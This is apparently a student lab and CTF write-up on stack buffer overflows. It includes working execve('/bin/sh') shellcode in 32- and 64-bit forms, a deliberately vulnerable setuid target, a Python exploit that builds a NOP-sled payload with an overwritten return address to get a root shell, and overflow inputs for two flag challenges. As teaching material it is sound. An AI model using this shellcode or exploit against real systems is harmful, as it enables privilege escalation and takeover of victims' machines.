# Work on week #5

## Tasks done

### 1

* The main goal of this task is to understand how to run shellcode and take advantage of it as an attacker.

* We can create shellcode in 2 different versions- in 32 or 64 bits. The main difference between them are the name and number of the registers used on the programs.

* In order to complete this task, we had to compile these file (call_shellcode.c), with the command ```make all```, which will generate the 2 runnable versions:

```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

// Binary code for setuid(0) 
// 64-bit:  "\x48\x31\xff\x48\x31\xc0\xb0\x69\x0f\x05"
// 32-bit:  "\x31\xdb\x31\xc0\xb0\xd5\xcd\x80"


const char shellcode[] =
#if __x86_64__
  "\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e"
  "\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57"
  "\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05"
#else
  "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
  "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
  "\xd2\x31\xc0\xb0\x0b\xcd\x80"
#endif
;

int main(int argc, char **argv)
{
   char code[500];

   strcpy(code, shellcode);
   int (*func)() = (int(*)())code;

   func();
   return 1;
}

```

*  This file pushes store those registers to the code variable and make the pointers to those registers (made by the ```func()```), according to the respective version (32 or 64 bits). Those registers address to the assembly commands needed to execute a shell.

* The ```make all``` has a special flag, the ```-z execstack```, which creates an execution stack to the compiled program. This results in the execution of the commands stored in the registers that were copied in the code variable. In other words, the variable code will be the execution stack.

* After running both executables (a32.out and a64.out), we reached to the same output: we opened a shell. We know that due to the existence of the dollar sign ($) in the terminal, as it is shown below.

![](https://i.imgur.com/T6g88ed.png)

<p> 
    Fig.1- Execution of a32.out and 64.out. Both programs successfully open a shell.
</p>


* In conclusion, if an attacker successfully smashes the call stack, he/she can alter the normal program flow of the vulnerable process and inject this shellcode in order to open a shell code and gain full control of victim's machine, which would be quite dangerous. However, it is essential to execute it the ```-z execstack```, otherwise it won't work (it creates a segmentation fault).


![](https://i.imgur.com/tvilJmV.png)

<p> 
    Fig.2- Execution without the exectack flag
</p>

### 2

The second task is to set up the file to be exploited. For this we are given the c file:

```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

/* Changing this size will change the layout of the stack.
 * Instructors can change this value each year, so students
 * won't be able to use the solutions from the past.
 */
#ifndef BUF_SIZE
#define BUF_SIZE 100
#endif

void dummy_function(char *str);

int bof(char *str)
{
    char buffer[BUF_SIZE];

    // The following statement has a buffer overflow problem 
    strcpy(buffer, str);       

    return 1;
}

int main(int argc, char **argv)
{
    char str[517];
    FILE *badfile;

    badfile = fopen("badfile", "r"); 
    if (!badfile) {
       perror("Opening badfile"); exit(1);
    }

    int length = fread(str, sizeof(char), 517, badfile);
    printf("Input size: %d\n", length);
    dummy_function(str);
    fprintf(stdout, "==== Returned Properly ====\n");
    return 1;
}

// This function is used to insert a stack frame of size 
// 1000 (approximately) between main's and bof's stack frames. 
// The function itself does not do anything. 
void dummy_function(char *str)
{
    char dummy_buffer[1000];
    memset(dummy_buffer, 0, 1000);
    bof(str);
}

```

The file has a buffer overflow vunerability in the strcpy command because the function doesn't check for boundaries, that means that if the program is a root owned set-UID file we can feed the function a string that makes it spawn a root shell

For this to be exploitable it is needed for the OS safeguards be turned off and for the the code to be compiled with the following flags ```-z execstack -fno-stack-protector```

### 3

#### Step 1

* In this task our goal is exploit the buffer-overflow vulnerability in the target program.
* We will use a debugger method to find it out and we need to use gdb to debug stack-L1-dbg.

![](https://i.imgur.com/7EVXzdI.png)


<p> 
    Fig.3- Important values to make the attack
</p>
 
#### Step 2

```python
#!/usr/bin/python3
import sys
shellcode= (
    "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
  "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
  "\xd2\x31\xc0\xb0\x0b\xcd\x80"
 # ✩ Need to change ✩
).encode(’latin-1’)
# Fill the content with NOP’s
content = bytearray(0x90 for i in range(517))
##################################################################
# Put the shellcode somewhere in the payload
start = 490 # ✩ Need to change ✩
content[start:start + len(shellcode)] = shellcode
# Decide the return address value
# and put it somewhere in the payload
ret = 0xFFFFCB96 #if 32 bits senão 0x48
# ✩ Need to change ✩
offset = 112  #Number of bytes of the buffer in task 2 (???) # ✩ Need to change ✩
L = 4 # Use 4 for 32-bit address and 8 for 64-bit address
content[offset:offset + L] = (ret).to_bytes(L,byteorder=’little’)
##################################################################
# Write the content to a file
with open(’badfile’, ’wb’) as f:
f.write(content)
```

* We put our **start** to 490 because the buffer has a size of 517 and our shell has a  size of 27 bytes,so 517-27=490.
* Our **ret** is for change the point to our shellcode.We have a information of the value of buf is 0*ffffc9fc.We do 0*ffffc9fc +490.This sum give us our return address which was 0*ffffcbe6 .
* **Offset** is where we inject out return address thats points to our shellcode.We also know the address of ebp is 0*ffffca68 and the buffer address is 0*ffffc9fc so ebp starts after 108 bytes of edp,but we cannot forget to add more 4 bytes to 108 bytes because of size the edp is 4 bytes.
* Now for test this we open terminal where exploit.py and stack_l1 is located.If we can get access to rootshell so is correct.

![](https://i.imgur.com/K5rpE74.png)


### CTF's

#### Challenge 1

* In order to complete this challenge, we have to answer the following questions:

1. Is there any file which is opened and read by the program?

2. Is it possible to control the opened file?

3. Is there any buffer-overflow vulnerability? If so, what can be done?

* If we analyse carefully the 'main.c' file, we can answer the previous questions.

> main.c:

```c
#include <stdio.h>
#include <stdlib.h>

int main() {
    char meme_file[8] = "mem.txt\0";
    char buffer[20];

    printf("Try to unlock the flag.\n");
    printf("Show me what you got:");
    fflush(stdout);
    scanf("%28s", &buffer);

    printf("Echo %s\n", buffer);

    printf("I like what you got!\n");
    
    FILE *fd = fopen(meme_file,"r");
    
    while(1){
        if(fd != NULL && fgets(buffer, 20, fd) != NULL) {
            printf("%s", buffer);
        } else {
            break;
        }
    }


    fflush(stdout);
    
    return 0;
}
```

1) Is there any file which is opened and read by the program?

> Yes, the "mem.txt" is opened and read by the program.

![](https://i.imgur.com/HyeparZ.png)

2) Is it possible to control the opened file?

> Yes, I can alter the content of the variable meme_file, by swithing the content of that variable.

3) Is there any buffer-overflow vulnerability? If so, what can be done?

> Yes, it has: the buffer has 20B long, however, scanf will read 28. So, we can overwrite the buffer and since the variable meme_file has 8B long and it is called before the buffer.

![](https://i.imgur.com/ChN6FCN.png)


* So, to explore this vulnerability, that is, to overwrite the buffer, we opened the 'exploit-example.py' and tried in debug mode to insert 20 random characters, which corresponds the 20B of the buffer. Then we added to it the name of the file to be read, "flag.txt" which has 8B long, the same size of the ```meme_file```.

![](https://i.imgur.com/YTrW12z.png)

* After run it, we obtained the content of the file, the flag_placeholder, which means we successfully accessed the content of the file.

![](https://i.imgur.com/TznnB9Y.png)

* Finally, we turned off the debug mode, by asserted the ```DEBUG``` variable as False and runned the 'exploit-example.py'. As a result, we obtained the flag value.

![](https://i.imgur.com/cjahTZq.png)


#### Challenge 2

* In order to complete this CTF, we have to answer these questions:

1. What changes were made?

2. Did they solve completely the problem?

3. Is it possible to overcome those changes with a similar approach?

* We started to analyse the "main.c" in order to answer the previous questions.

> main.c

```c
#include <stdio.h>
#include <stdlib.h>

int main() {
    char meme_file[8] = "mem.txt\0";
    char val[4] = "\xef\xbe\xad\xde";
    char buffer[20];

    printf("Try to unlock the flag.\n");
    printf("Show me what you got:");
    fflush(stdout);
    scanf("%32s", &buffer);
    if(*(int*)val == 0xfefc2223) {
        printf("I like what you got!\n");
        
        FILE *fd = fopen(meme_file,"r");
        
        while(1){
            if(fd != NULL && fgets(buffer, 20, fd) != NULL) {
                printf("%s", buffer);
            } else {
                break;
            }
        }
    } else {
        printf("You gave me this %s and the value was %p. Disqualified!\n", meme_file, *(long*)val);
    }

    fflush(stdout);
    
    return 0;
}
```

* We noticed that there was an extra variable called "val" and the scanf scans more bytes than before (now scans 32B).

![](https://i.imgur.com/j8O9aef.png)


* Secondly, it seems to solve the problem, in fact, since it is necessary that "val" needs to have a specific value to read a file, working like a token, which should lead to a more secure algorithm. However, once we insert the correct value of "val", the same problem persists. In other words, the program still has the buffer-overflow vulnerability.

* In conclusion, we can overcome the mitigations of the problem using a similar strategy used in CTF #1- we can add the same random bytes and the file name pretended, but we need to put between them value of ```val```, since sum of size of this variable and she size of the buffer and ```meme_file``` equals to 32B, the number of the bytes read by scanf.

* We have everything we need to attack the vulnerability. In a first approach, we modified the exploit-example.py to debug mode, that is, assert the variable ```DEBUG``` as True, switched to the correct port (for this challenge was 4000) and inserted the same random bytes and the name of file to be read "flag.txt", like the previous challenge. But now, we need to put the correct value of the val so it can enter in the "if" condition of "main.c".

*  This value is 0xFEFC2223 (the value in the "if"). Since it is an int pointer, we neeed to put the bytes backwards. In order words, we put "\x23\x22\xfc\xfe" in the middle of the string to be scanned by scanf. This is how exploit-example.py in debug mode looked like:

![](https://i.imgur.com/NTlxeGs.png)

* We runned and our strategy was correct- we obtained the content of flag.txt.

![](https://i.imgur.com/eBui8mW.png)

* We, asserted the ```DEBUG``` variable as False, in order to attack the exploit and obtained the value of the flag.

![](https://i.imgur.com/BHszPfO.png)
